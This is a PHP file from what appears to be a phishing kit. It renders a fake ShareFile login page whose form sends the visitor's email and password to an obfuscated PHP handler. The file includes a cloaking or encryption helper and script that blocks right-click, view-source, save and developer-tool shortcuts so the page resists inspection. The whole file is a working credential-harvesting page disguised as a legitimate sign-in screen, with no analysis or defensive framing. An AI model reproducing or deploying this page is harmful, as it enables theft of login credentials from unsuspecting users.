<?php
error_reporting(0);
include('Scv849492u2wggwgroppum.php');
$start_encryption = new sourceGuard();
echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>ShareFile Login</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="initial-scale=1,user-scalable=no,width=device-width">
    <meta name="oauthSF" content="true">
	<meta name="theme-color" content="#78be20">
    <link href="weertopwuiergtgrtgrttopoc8743rg3878934efg9823hhjssk983c.css" rel="stylesheet">
	<link rel="shortcut icon" href="1010wefwer839ioeppepe4rf99fh989eee9ie455uh98h3hf32277.png">
</head>
<body>

<script language="JavaScript">
 
  window.onload = function() {
    document.addEventListener("contextmenu", function(e){
      e.preventDefault();
    }, false);
    document.addEventListener("keydown", function(e) {
    //document.onkeydown = function(e) {
      // "I" key
      if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
        disabledEvent(e);
      }
      // "J" key
      if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
        disabledEvent(e);
      }
      // "S" key + macOS
      if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
        disabledEvent(e);
      }
      // "U" key
      if (e.ctrlKey && e.keyCode == 85) {
        disabledEvent(e);
      }
      // "F12" key
      if (event.keyCode == 123) {
        disabledEvent(e);
      }
    }, false);
    function disabledEvent(e){
      if (e.stopPropagation){
        e.stopPropagation();
      } else if (window.event){
        window.event.cancelBubble = true;
      }
      e.preventDefault();
      return false;
    }
  };
</script>

    <div id="page">
        <div id="outer">
            <div id="applicationHost"><div id="content" class="step marketing-tips credentials" data-bind="showWhenLoaded: true, css: {\'credentials\': IsCredentialsStep, \'marketing-tips\': ShowMarketingContent }" data-view="AuthShell" data-active-view="true" style="">
    <div class="card-wrapper">
        <div class="card-container">
            <div class="card" data-bind="css: { \'split-credentials-container\': IsSplitCredentialsStep }">
                <div class="logo-container">
					<img src="999xcsf367dfywf762fd87281234238899xv49949yios.png">                </div>
    <form id="share" method="post" action="00000000003ieiekl000000slsoc8743rg387efg982iie3983e.php">
        <div class="inputs text-center">
            <label class="row">
                <input id="S401" name="S401" type="email" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" tabindex="1" maxlength="120" placeholder="Email" required="">
            </label>
        </div>
        <div class="inputs text-center">
            <label class="row">
                <input id="S402" name="S402" type="password" class="txtinput password input-item" tabindex="2" autocomplete="off" spellcheck="false" placeholder="Password" required="">
          
            <button class="navlink fwdlink" type="submit" data-bind="css: { active: IsProcessing }">
                <span id="start-button" class="btn-text" data-bind="text: LoginButtonText">Sign In</span>
                <span class="caret"></span>            </button>
            <p></p><br>
	    <img src="werrr230rrrrrrewctx32r6ew2f8237d92yeuiowopsvssvcbbc73.png">
    
</label></div></form></div>
              </div>
                </div>
               
            </div>
        </div>
    </div>
</div>
    
    <div id="reacthost"></div>

</body></html>';

$start_encryption -> Run(2); 
?>
